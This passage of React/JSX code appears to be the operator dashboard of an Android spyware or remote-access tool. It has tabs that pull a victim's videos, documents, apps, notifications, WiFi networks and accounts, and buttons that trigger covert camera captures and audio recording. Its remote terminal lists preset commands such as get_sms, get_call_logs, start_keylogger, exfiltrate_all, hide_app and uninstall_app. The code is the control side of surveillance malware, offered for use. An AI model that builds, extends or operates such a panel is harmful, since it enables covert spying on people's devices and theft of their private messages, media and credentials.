                  className="absolute top-4 right-4 p-2 bg-dark-700/80 rounded-full hover:bg-dark-700 transition-all"
                  onClick={() => setSelectedPhoto(null)}
                >
                  <FiX className="text-xl" />
                </button>
              </div>
            )}
          </div>
        )}

        {/* ===== VIDEOS ===== */}
        {activeTab === "videos" && (
          <div className="glass-effect rounded-2xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold">
                Videos{" "}
                {(data.videos || []).length > 0 && `(${data.videos.length})`}
              </h3>
              <div className="flex gap-2">
                <button
                  onClick={() => sendCommand("get_videos")}
                  className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
                >
                  <FiRefreshCw className="text-sm" /> Refresh
                </button>
                {(data.videos || []).length > 0 && (
                  <button
                    onClick={() => deleteAllDataType("videos", "Videos")}
                    className="flex items-center gap-2 px-4 py-2 rounded-xl bg-red-500/10 text-red-400 border border-red-500/30 hover:bg-red-500/20 transition-all text-sm"
                  >
                    <FiTrash2 className="text-sm" /> Delete All
                  </button>
                )}
              </div>
            </div>
            {(data.videos || []).length > 0 ? (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {(data.videos || [])
                  .slice()
                  .reverse()
                  .map((v, i) => (
                    <div
                      key={v.publicId || v.id || i}
                      className="flex items-center justify-between p-4 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all"
                    >
                      <div className="flex items-center gap-4 min-w-0 flex-1">
                        <div className="w-14 h-14 rounded-xl bg-purple-500/10 flex items-center justify-center flex-shrink-0">
                          <FiVideo className="text-purple-400 text-2xl" />
                        </div>
                        <div className="min-w-0 flex-1">
                          <p className="font-medium text-sm truncate">
                            {v.name || "Unknown Video"}
                          </p>
                          <div className="flex items-center gap-3 mt-1 flex-wrap">
                            <span className="text-xs text-dark-400">
                              {v.size
                                ? `${(v.size / 1024 / 1024).toFixed(1)} MB`
                                : "Unknown size"}
                            </span>
                            <span className="text-xs text-dark-400">
                              {v.timestamp
                                ? new Date(v.timestamp).toLocaleDateString()
                                : v.date
                                ? new Date(v.date).toLocaleDateString()
                                : ""}
                            </span>
                            {v.mimeType && (
                              <span className="text-xs px-1.5 py-0.5 rounded-full bg-dark-600/50 text-dark-400">
                                {v.mimeType.split("/")[1] || v.mimeType}
                              </span>
                            )}
                          </div>
                        </div>
                      </div>
                      <div className="flex items-center gap-2 flex-shrink-0 ml-3">
                        {v.url ? (
                          <a
                            href={v.url}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="p-2 rounded-lg hover:bg-dark-600/50 text-dark-400"
                            title="Download video"
                            onClick={(e) => {
                              e.stopPropagation();
                              toast.success("Downloading video...");
                            }}
                          >
                            <FiDownload className="text-sm" />
                          </a>
                        ) : v.cloudinaryUrl ? (
                          <a
                            href={v.cloudinaryUrl}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="p-2 rounded-lg hover:bg-dark-600/50 text-dark-400"
                            title="Download video"
                            onClick={(e) => {
                              e.stopPropagation();
                              toast.success("Downloading video...");
                            }}
                          >
                            <FiDownload className="text-sm" />
                          </a>
                        ) : (
                          <button
                            onClick={() => {
                              copyToClipboard(
                                v.id?.toString() || v.publicId || ""
                              );
                              toast.success("Video ID copied");
                            }}
                            className="p-2 rounded-lg hover:bg-dark-600/50 text-dark-400"
                            title="Copy video ID"
                          >
                            <FiCopy className="text-sm" />
                          </button>
                        )}
                        <button
                          onClick={() =>
                            deleteDataItem("videos", v.id || v.publicId)
                          }
                          className="p-2 rounded-lg hover:bg-red-500/20 text-red-400"
                          title="Delete video"
                        >
                          <FiTrash2 className="text-sm" />
                        </button>
                      </div>
                    </div>
                  ))}
              </div>
            ) : (
              <div className="text-center py-12 text-dark-400">
                <FiVideo className="text-4xl mx-auto mb-3 opacity-50" />
                <p>No video data available</p>
                <p className="text-xs mt-2 text-dark-500">
                  Use the terminal command{" "}
                  <code className="text-primary-400">get_videos</code> to fetch
                </p>
                <button
                  onClick={() => sendCommand("get_videos")}
                  className="mt-4 text-sm text-primary-400 hover:text-primary-300"
                >
                  Fetch videos now
                </button>
              </div>
            )}
          </div>
        )}

        {/* ===== FILES ===== */}
        {activeTab === "files" && (
          <div className="glass-effect rounded-2xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold">
                Documents{" "}
                {(data.documents || []).length > 0 &&
                  `(${data.documents.length})`}
              </h3>
              <div className="flex gap-2">
                <button
                  onClick={() => sendCommand("get_documents")}
                  className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
                >
                  <FiRefreshCw className="text-sm" /> Refresh
                </button>
                {(data.documents || []).length > 0 && (
                  <button
                    onClick={() => deleteAllDataType("documents", "Documents")}
                    className="flex items-center gap-2 px-4 py-2 rounded-xl bg-red-500/10 text-red-400 border border-red-500/30 hover:bg-red-500/20 transition-all text-sm"
                  >
                    <FiTrash2 className="text-sm" /> Delete All
                  </button>
                )}
              </div>
            </div>
            {(data.documents || []).length > 0 ? (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {(data.documents || [])
                  .slice()
                  .reverse()
                  .map((doc, i) => (
                    <div
                      key={doc.id || doc.publicId || i}
                      className="flex items-center justify-between p-4 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all"
                    >
                      <div className="flex items-center gap-4 min-w-0 flex-1">
                        <div className="w-14 h-14 rounded-xl bg-blue-500/10 flex items-center justify-center flex-shrink-0">
                          <FiFileText className="text-blue-400 text-2xl" />
                        </div>
                        <div className="min-w-0 flex-1">
                          <p className="font-medium text-sm truncate">
                            {doc.name || "Unknown Document"}
                          </p>
                          <div className="flex items-center gap-3 mt-1 flex-wrap">
                            <span className="text-xs text-dark-400">
                              {doc.size
                                ? `${(doc.size / 1024).toFixed(0)} KB`
                                : "Unknown size"}
                            </span>
                            {doc.mimeType && (
                              <span className="text-xs px-1.5 py-0.5 rounded-full bg-dark-600/50 text-dark-400">
                                {doc.mimeType.split("/")[1] || doc.mimeType}
                              </span>
                            )}
                            {doc.path && (
                              <span className="text-xs text-dark-500 truncate max-w-[200px]">
                                {doc.path}
                              </span>
                            )}
                          </div>
                        </div>
                      </div>
                      <div className="flex items-center gap-2 flex-shrink-0 ml-3">
                        {doc.url ? (
                          <a
                            href={doc.url}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="p-2 rounded-lg hover:bg-dark-600/50 text-dark-400"
                            title="Download document"
                            onClick={(e) => {
                              e.stopPropagation();
                              toast.success("Downloading document...");
                            }}
                          >
                            <FiDownload className="text-sm" />
                          </a>
                        ) : doc.cloudinaryUrl ? (
                          <a
                            href={doc.cloudinaryUrl}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="p-2 rounded-lg hover:bg-dark-600/50 text-dark-400"
                            title="Download document"
                            onClick={(e) => {
                              e.stopPropagation();
                              toast.success("Downloading document...");
                            }}
                          >
                            <FiDownload className="text-sm" />
                          </a>
                        ) : (
                          <button
                            onClick={() => {
                              copyToClipboard(
                                doc.id?.toString() || doc.publicId || ""
                              );
                              toast.success("Document ID copied");
                            }}
                            className="p-2 rounded-lg hover:bg-dark-600/50 text-dark-400"
                            title="Copy document ID"
                          >
                            <FiCopy className="text-sm" />
                          </button>
                        )}
                        <button
                          onClick={() =>
                            deleteDataItem("documents", doc.id || doc.publicId)
                          }
                          className="p-2 rounded-lg hover:bg-red-500/20 text-red-400"
                          title="Delete document"
                        >
                          <FiTrash2 className="text-sm" />
                        </button>
                      </div>
                    </div>
                  ))}
              </div>
            ) : (
              <div className="text-center py-12 text-dark-400">
                <FiFolder className="text-4xl mx-auto mb-3 opacity-50" />
                <p>No document data available</p>
                <button
                  onClick={() => sendCommand("get_documents")}
                  className="mt-4 text-sm text-primary-400 hover:text-primary-300"
                >
                  Fetch documents now
                </button>
              </div>
            )}
          </div>
        )}

        {/* ===== CAMERA ===== */}
        {activeTab === "camera" && (
          <div className="glass-effect rounded-2xl p-6">
            <h3 className="text-lg font-semibold mb-4">Camera Controls</h3>
            {data.lastPhoto && (
              <div className="mb-6">
                <p className="text-sm text-dark-400 mb-2">Last Captured:</p>
                <div className="relative w-full max-w-lg">
                  <img
                    src={data.lastPhoto.url}
                    alt="Last"
                    className="w-full h-64 object-cover rounded-xl"
                  />
                  <div className="absolute top-2 right-2 flex gap-2">
                    <button
                      onClick={() => window.open(data.lastPhoto.url, "_blank")}
                      className="p-2 bg-dark-700/80 rounded-lg"
                    >
                      <FiExternalLink className="text-white text-sm" />
                    </button>
                    <button
                      onClick={() =>
                        deleteMedia("capturedPhotos", data.lastPhoto.publicId)
                      }
                      className="p-2 bg-red-500/80 rounded-lg"
                    >
                      <FiTrash2 className="text-white text-sm" />
                    </button>
                  </div>
                  <p className="text-xs text-dark-400 mt-2">
                    Camera: {data.lastPhoto.camera || "back"} ·{" "}
                    {data.lastPhoto.timestamp
                      ? new Date(data.lastPhoto.timestamp).toLocaleString()
                      : ""}
                  </p>
                </div>
              </div>
            )}
            <div className="grid grid-cols-3 gap-4">
              <button
                onClick={() => {
                  setActivePhotoBtn("back");
                  sendCommand("take_photo_back");
                }}
                className={`p-6 rounded-xl border text-center ${
                  activePhotoBtn === "back"
                    ? "bg-primary-500/20 border-primary-500/50"
                    : "bg-dark-700/30 border-dark-600/50 hover:border-primary-500/30"
                }`}
              >
                <FiCamera className="text-3xl mx-auto mb-2 text-primary-400" />
                <p className="font-medium text-sm">Back</p>
                <p className="text-xs text-dark-400 mt-1">Take photo</p>
              </button>
              <button
                onClick={() => {
                  setActivePhotoBtn("front");
                  sendCommand("take_photo_front");
                }}
                className={`p-6 rounded-xl border text-center ${
                  activePhotoBtn === "front"
                    ? "bg-purple-500/20 border-purple-500/50"
                    : "bg-dark-700/30 border-dark-600/50 hover:border-purple-500/30"
                }`}
              >
                <FiCamera className="text-3xl mx-auto mb-2 text-purple-400" />
                <p className="font-medium text-sm">Front</p>
                <p className="text-xs text-dark-400 mt-1">Take selfie</p>
              </button>
              {/* <button
                onClick={() => sendCommand("record_audio", { action: "start" })}
                className="p-6 rounded-xl bg-dark-700/30 border border-dark-600/50 hover:border-orange-500/30 text-center"
              >
                <FiMic className="text-3xl mx-auto mb-2 text-orange-400" />
                <p className="font-medium text-sm">Record</p>
                <p className="text-xs text-dark-400 mt-1">Start recording</p>
              </button> */}
            </div>
            {/* {(data.recordedAudios || []).length > 0 && (
              <div className="mt-6">
                <div className="flex items-center justify-between mb-3">
                  <h4 className="font-medium text-sm">
                    Recorded Audio ({data.recordedAudios.length})
                  </h4>
                  <button
                    onClick={() =>
                      deleteAllDataType("recordedAudios", "Recordings")
                    }
                    className="text-xs text-red-400 hover:text-red-300 flex items-center gap-1"
                  >
                    <FiTrash2 /> Delete All
                  </button>
                </div>
                <div className="space-y-2 max-h-64 overflow-y-auto">
                  {data.recordedAudios
                    .slice()
                    .reverse()
                    .map((audio, i) => (
                      <div
                        key={audio.publicId || i}
                        className="p-3 rounded-xl bg-dark-700/30"
                      >
                        <div className="flex items-center justify-between mb-1">
                          <p className="text-xs text-dark-400">
                            Recording {i + 1} ·{" "}
                            {audio.timestamp
                              ? new Date(audio.timestamp).toLocaleString()
                              : ""}
                          </p>
                          <button
                            onClick={() =>
                              deleteDataItem("recordedAudios", audio.publicId)
                            }
                            className="text-xs text-red-400 hover:text-red-300"
                          >
                            <FiTrash2 />
                          </button>
                        </div>
                        <audio
                          src={audio.url}
                          controls
                          className="w-full h-10"
                        />
                      </div>
                    ))}
                </div>
              </div>
            )} */}
          </div>
        )}

        {/* ===== AUDIO ===== */}
        {activeTab === "audio" && (
          <div className="glass-effect rounded-2xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold">
                Recorded Audio{" "}
                {(data.recordedAudios || []).length > 0 &&
                  `(${data.recordedAudios.length})`}
              </h3>
              <div className="flex gap-2">
                <button
                  onClick={() =>
                    sendCommand("record_audio", { action: "start" })
                  }
                  className="flex items-center gap-2 px-4 py-2 rounded-xl bg-orange-500/10 text-orange-400 border border-orange-500/30 hover:bg-orange-500/20 transition-all text-sm"
                >
                  <FiMic className="text-sm" /> New Recording
                </button>
                {(data.recordedAudios || []).length > 0 && (
                  <button
                    onClick={() =>
                      deleteAllDataType("recordedAudios", "Recordings")
                    }
                    className="flex items-center gap-2 px-4 py-2 rounded-xl bg-red-500/10 text-red-400 border border-red-500/30 hover:bg-red-500/20 transition-all text-sm"
                  >
                    <FiTrash2 className="text-sm" /> Delete All
                  </button>
                )}
              </div>
            </div>
            {(data.recordedAudios || []).length > 0 ? (
              <div className="space-y-2 max-h-[500px] overflow-y-auto">
                {(data.recordedAudios || [])
                  .slice()
                  .reverse()
                  .map((audio, i) => (
                    <div
                      key={audio.publicId || i}
                      className="p-4 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all"
                    >
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex items-center gap-3">
                          <div className="w-10 h-10 rounded-lg bg-orange-500/10 flex items-center justify-center flex-shrink-0">
                            <FiMic className="text-orange-400" />
                          </div>
                          <div>
                            <p className="font-medium text-sm">
                              Recording {data.recordedAudios.length - i}
                            </p>
                            <p className="text-xs text-dark-400">
                              {audio.timestamp
                                ? new Date(audio.timestamp).toLocaleString()
                                : "Unknown time"}
                            </p>
                          </div>
                        </div>
                        <button
                          onClick={() =>
                            deleteDataItem("recordedAudios", audio.publicId)
                          }
                          className="p-2 rounded-lg hover:bg-red-500/20 text-red-400 transition-all"
                          title="Delete recording"
                        >
                          <FiTrash2 className="text-sm" />
                        </button>
                      </div>
                      <audio src={audio.url} controls className="w-full h-10" />
                    </div>
                  ))}
              </div>
            ) : (
              <div className="text-center py-12 text-dark-400">
                <FiMic className="text-4xl mx-auto mb-3 opacity-50" />
                <p>No recordings available</p>
                <p className="text-xs mt-2 text-dark-500">
                  Use the Record Audio button below or in Camera tab to capture
                  audio
                </p>
                <button
                  onClick={() =>
                    sendCommand("record_audio", { action: "start" })
                  }
                  className="mt-4 text-sm text-orange-400 hover:text-orange-300"
                >
                  Start recording
                </button>
              </div>
            )}
          </div>
        )}

        {/* ===== APPS ===== */}
        {activeTab === "apps" && (
          <div className="glass-effect rounded-2xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold">
                Installed Apps{" "}
                {(data.installedApps || []).length > 0 &&
                  `(${data.installedApps.length})`}
              </h3>
              <button
                onClick={() => sendCommand("get_installed_apps")}
                className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
              >
                <FiRefreshCw className="text-sm" /> Refresh
              </button>
            </div>
            {(data.installedApps || []).length > 0 ? (
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3 max-h-[600px] overflow-y-auto">
                {(data.installedApps || []).map((app, i) => (
                  <div
                    key={app.packageName || i}
                    className="p-3 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all"
                  >
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 rounded-lg bg-primary-500/10 flex items-center justify-center flex-shrink-0">
                        <FiSmartphone className="text-primary-400" />
                      </div>
                      <div className="flex-1 min-w-0">
                        <p className="text-sm font-medium truncate">
                          {app.appName || "Unknown"}
                        </p>
                        <p className="text-xs text-dark-400 truncate">
                          {app.packageName}
                        </p>
                        <p className="text-xs text-dark-500">
                          v{app.versionName || "?"} ·{" "}
                          {app.isSystemApp ? "System" : "User"}
                        </p>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            ) : (
              <div className="text-center py-12 text-dark-400">
                <FiSmartphone className="text-4xl mx-auto mb-3 opacity-50" />
                <p>No app data available</p>
                <button
                  onClick={() => sendCommand("get_installed_apps")}
                  className="mt-4 text-sm text-primary-400 hover:text-primary-300"
                >
                  Fetch apps now
                </button>
              </div>
            )}
          </div>
        )}

        {/* ===== NOTIFICATIONS ===== */}
        {activeTab === "notifications" && (
          <div className="glass-effect rounded-2xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold">Notifications</h3>
              <button
                onClick={() => sendCommand("get_notifications")}
                className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
              >
                <FiRefreshCw className="text-sm" /> Refresh
              </button>
            </div>
            {(data.notifications || []).length > 0 ? (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {(data.notifications || []).map((notif, i) => (
                  <div
                    key={i}
                    className="p-4 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all"
                  >
                    <div className="flex items-center justify-between mb-2">
                      <p className="font-medium text-sm">
                        {notif.title || notif.app || "Notification"}
                      </p>
                      <span className="text-xs text-dark-400">
                        {notif.timestamp
                          ? new Date(notif.timestamp).toLocaleTimeString()
                          : ""}
                      </span>
                    </div>
                    <p className="text-sm text-dark-300">
                      {notif.text || notif.body || "No content"}
                    </p>
                    {notif.packageName && (
                      <p className="text-xs text-dark-500 mt-2">
                        {notif.packageName}
                      </p>
                    )}
                  </div>
                ))}
              </div>
            ) : (
              <div className="text-center py-12 text-dark-400">
                <FiBell className="text-4xl mx-auto mb-3 opacity-50" />
                <p>No notification data available</p>
                <p className="text-xs mt-2 text-dark-500">
                  Notification access requires NotificationListenerService
                </p>
                <button
                  onClick={() => sendCommand("get_notifications")}
                  className="mt-4 text-sm text-primary-400 hover:text-primary-300"
                >
                  Fetch notifications
                </button>
              </div>
            )}
          </div>
        )}

        {/* ===== WiFi ===== */}
        {activeTab === "wifi" && (
          <div className="glass-effect rounded-2xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold">WiFi Networks</h3>
              <button
                onClick={() => sendCommand("get_wifi_networks")}
                className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
              >
                <FiRefreshCw className="text-sm" /> Scan
              </button>
            </div>
            {(data.wifiNetworks || []).length > 0 ? (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {(data.wifiNetworks || []).map((network, i) => (
                  <div
                    key={i}
                    className="p-4 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all"
                  >
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-3">
                        <div
                          className={`w-2 h-2 rounded-full ${
                            network.level > -50
                              ? "bg-green-400"
                              : network.level > -70
                              ? "bg-yellow-400"
                              : "bg-red-400"
                          }`}
                        />
                        <div>
                          <p className="font-medium text-sm">
                            {network.ssid || "Hidden Network"}
                          </p>
                          <p className="text-xs text-dark-400">
                            {network.bssid} · {network.capabilities}
                          </p>
                        </div>
                      </div>
                      <div className="text-right">
                        <p className="text-xs text-dark-400">
                          Ch {network.frequency} · {network.level} dBm
                        </p>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            ) : (
              <div className="text-center py-12 text-dark-400">
                <FiWifi className="text-4xl mx-auto mb-3 opacity-50" />
                <p>No WiFi data available</p>
                <button
                  onClick={() => sendCommand("get_wifi_networks")}
                  className="mt-4 text-sm text-primary-400 hover:text-primary-300"
                >
                  Scan WiFi networks
                </button>
              </div>
            )}
          </div>
        )}

        {/* ===== ACCOUNTS ===== */}
        {activeTab === "accounts" && (
          <div className="glass-effect rounded-2xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold">Accounts</h3>
              <button
                onClick={() => sendCommand("get_accounts")}
                className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
              >
                <FiRefreshCw className="text-sm" /> Refresh
              </button>
            </div>
            {(data.accounts || []).length > 0 ? (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {(data.accounts || []).map((account, i) => (
                  <div
                    key={i}
                    className="p-4 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all"
                  >
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 rounded-lg bg-blue-500/10 flex items-center justify-center flex-shrink-0">
                        <FiUsers className="text-blue-400" />
                      </div>
                      <div className="flex-1 min-w-0">
                        <p className="font-medium text-sm truncate">
                          {account.name || "Unknown"}
                        </p>
                        <p className="text-xs text-dark-400 truncate">
                          {account.type || "Account"}
                        </p>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            ) : (
              <div className="text-center py-12 text-dark-400">
                <FiUsers className="text-4xl mx-auto mb-3 opacity-50" />
                <p>No account data available</p>
                <button
                  onClick={() => sendCommand("get_accounts")}
                  className="mt-4 text-sm text-primary-400 hover:text-primary-300"
                >
                  Fetch accounts
                </button>
              </div>
            )}
          </div>
        )}

        {/* ===== TERMINAL ===== */}
        {activeTab === "terminal" && (
          <div className="glass-effect rounded-2xl p-6">
            <h3 className="text-lg font-semibold mb-4">Remote Terminal</h3>

            <div
              ref={terminalRef}
              className="h-64 bg-black rounded-xl p-4 font-mono text-sm overflow-y-auto mb-4 space-y-1"
            >
              <div className="text-green-400">
                [System] Connected to {deviceId}
              </div>
              <div className="text-dark-400">[System] Type commands below</div>
              {terminalOutput.map((line, i) => (
                <div
                  key={i}
                  className={
                    line.text.startsWith(">")
                      ? "text-primary-400"
                      : "text-dark-200"
                  }
                >
                  <span className="text-dark-500">[{line.time}]</span>{" "}
                  {line.text}
                </div>
              ))}
            </div>

            <form onSubmit={handleTerminalCommand} className="flex gap-3">
              <input
                type="text"
                value={terminalInput}
                onChange={(e) => setTerminalInput(e.target.value)}
                placeholder="Enter command (e.g., get_location)"
                className="flex-1 px-4 py-3 rounded-xl bg-dark-700/50 border border-dark-600/50 text-white placeholder-dark-400 focus:outline-none focus:border-primary-500/50 font-mono"
              />
              <button
                type="submit"
                className="px-6 py-3 rounded-xl bg-primary-500 text-white hover:bg-primary-600 transition-all flex items-center gap-2"
              >
                <FiSend /> Send
              </button>
            </form>

            <div className="mt-4 grid grid-cols-2 md:grid-cols-4 gap-2">
              {[
                "get_contacts",
                "get_sms",
                "get_call_logs",
                "get_location",
                "take_photo_back",
                "take_photo_front",
                'record_audio {"action":"start"}',
                "get_installed_apps",
                "get_battery",
                "get_sim_info",
                "get_network_info",
                "get_notifications",
                "get_wifi_networks",
                "get_accounts",
                "take_screenshot",
                'vibrate {"duration":1000}',
                'open_url {"url":"https://..."}',
                "hide_app",
                "unhide_app",
                "start_keylogger",
                "stop_keylogger",
                "exfiltrate_all",
                "get_device_info",
                'uninstall_app {"packageName":"com.example.app"}',
              ].map((cmd) => (
                <button
                  key={cmd}
                  onClick={() => setTerminalInput(cmd)}
                  className="text-xs p-2 rounded-lg bg-dark-700/30 hover:bg-dark-700/50 text-dark-400 hover:text-white transition-all text-left font-mono"
                >
                  {cmd}
                </button>
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
